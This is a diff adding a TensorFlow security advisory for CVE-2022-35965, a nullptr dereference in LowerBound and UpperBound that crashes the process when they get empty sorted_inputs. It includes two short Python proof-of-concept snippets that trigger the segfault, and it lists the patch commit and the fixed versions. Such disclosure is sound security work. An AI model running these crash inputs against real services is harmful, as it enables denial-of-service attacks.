@@ -1,0 +1,25 @@
+<h2>TFSA-2022-097: Segfault in <code>LowerBound</code> and <code>UpperBound</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35965</p>
+<h3>Impact</h3>
+<p>If <code>LowerBound</code> or <code>UpperBound</code> is given an empty<code>sorted_inputs</code> input, it results in a <code>nullptr</code> dereference, leading to a segfault that can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf</p>
+<p>out_type = tf.int32
+sorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)
+values = tf.constant([], shape=[10,10,0,10,0], dtype=tf.float32)
+tf.raw_ops.LowerBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
+<code></code>python
+import tensorflow as tf</p>
+<p>out_type = tf.int64
+sorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)
+values = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)
+tf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea">bce3717eaef4f769019fd18e990464ca4a2efeea</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
